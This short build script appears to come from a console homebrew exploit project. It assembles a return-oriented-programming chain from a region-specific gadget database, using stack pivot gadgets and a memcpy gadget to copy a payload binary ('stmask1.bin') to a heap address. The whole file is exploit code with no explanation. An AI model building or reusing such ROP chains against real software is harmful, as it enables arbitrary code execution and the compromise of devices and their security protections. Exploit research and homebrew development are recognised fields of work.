import os
include('../../../ropdb/EUR.py')


add_word(HEAP_STAHED_DEST+0x4)
add_word(0)
add_word(0)
add_word(PIVOT_2)
add_word(PIVOT_4)
add_word(MEMCPY)
add_word(PIVOT_3)
add_word(os.path.getsize('build/stmask1.bin')) #memcpy size
add_word(PIVOT_1)

org(0x8C)
add_word(HEAP_STAHED_DEST)
